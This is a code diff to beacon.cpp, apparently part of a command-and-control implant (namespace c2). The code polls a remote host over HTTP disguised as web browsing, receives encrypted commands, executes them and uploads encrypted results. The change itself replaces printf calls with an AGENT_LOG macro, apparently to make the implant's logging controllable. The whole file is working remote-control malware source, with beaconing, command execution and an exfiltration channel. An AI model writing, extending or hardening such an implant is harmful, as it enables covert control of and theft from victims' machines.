@@ -1,6 +1,7 @@
 // beacon.cpp — Agent HTTP 轮询实现（协议 §8）
 // 流量收敛为周期性 GET/POST，无长连接；伪装成网页浏览。
 #include "beacon.h"
+#include "agent_debug.h"
 
 #include "agent_runtime.h"
 #include "cmd_dispatch.h"
@@ -275,7 +276,7 @@ void run_beacon(const std::string& host, uint16_t port,
     const std::string cookie = "SID=" + sid;
 
     std::vector<BeaconResult> pending;  // 待上传结果（下次轮询 POST）
-    printf("[beacon] started host=%s:%u sleeptime=%ds cookie=%s\n",
+    AGENT_LOG("[beacon] started host=%s:%u sleeptime=%ds cookie=%s\n",
            host.c_str(), port, sleeptime, sid.c_str());
 
     // 支持停止（EXE/DLL 统一）：stop 时跳出轮询循环
@@ -285,18 +286,18 @@ void run_beacon(const std::string& host, uint16_t port,
             std::vector<uint8_t> plain = encode_results(pending);
             std::vector<uint8_t> sealed;
             std::string err;
-            printf("[beacon] posting %zu results...\n", pending.size());
+            AGENT_LOG("[beacon] posting %zu results...\n", pending.size());
             if (aes_gcm_encrypt(beacon_key, 32, plain.data(), plain.size(), sealed, err)) {
                 std::string body = "data=" + url_encode(base64_encode(sealed.data(), sealed.size()));
                 std::string resp;
                 if (http_request(host, port, "POST", "/submit", cookie, body, resp)) {
                     pending.clear();  // 上传成功才清空
-                    printf("[beacon] results posted ok\n");
+                    AGENT_LOG("[beacon] results posted ok\n");
                 } else {
-                    printf("[beacon] POST failed\n");
+                    AGENT_LOG("[beacon] POST failed\n");
                 }
             } else {
-                printf("[beacon] encrypt results failed\n");
+                AGENT_LOG("[beacon] encrypt results failed\n");
             }
         }
 
@@ -313,7 +314,7 @@ void run_beacon(const std::string& host, uint16_t port,
                                         plain, err)) {
                         std::vector<BeaconCmd> cmds;
                         if (parse_commands(plain, cmds)) {
-                            printf("[beacon] got %zu cmds\n", cmds.size());
+                            AGENT_LOG("[beacon] got %zu cmds\n", cmds.size());
                             for (const auto& c : cmds) {
                                 uint8_t status = 0;
                                 std::vector<uint8_t> resp;
@@ -321,19 +322,19 @@ void run_beacon(const std::string& host, uint16_t port,
                                 // 与长连接信道保持一致（见 client/core/main.cpp）
                                 handle_command(c.cmd, c.payload.data(), c.payload.size(),
                                                resp, status);
-                                printf("[beacon] exec cmd=0x%04x seq=%u status=%u len=%zu\n",
+                                AGENT_LOG("[beacon] exec cmd=0x%04x seq=%u status=%u len=%zu\n",
                                        c.cmd, c.seq, status, resp.size());
                                 pending.push_back(
                                     BeaconResult{c.seq, status, std::move(resp)});
                             }
                         } else {
-                            printf("[beacon] parse commands failed\n");
+                            AGENT_LOG("[beacon] parse commands failed\n");
                         }
                     } else {
-                        printf("[beacon] decrypt token failed: %s\n", err.c_str());
+                        AGENT_LOG("[beacon] decrypt token failed: %s\n", err.c_str());
                     }
                 } else {
-                    printf("[beacon] base64 decode failed\n");
+                    AGENT_LOG("[beacon] base64 decode failed\n");
                 }
             }
         }
@@ -347,7 +348,7 @@ void run_beacon(const std::string& host, uint16_t port,
             actual = 1;
         agent_sleep(actual * 1000);
     }
-    printf("[beacon] stopped\n");
+    AGENT_LOG("[beacon] stopped\n");
 }
 
 }  // namespace c2
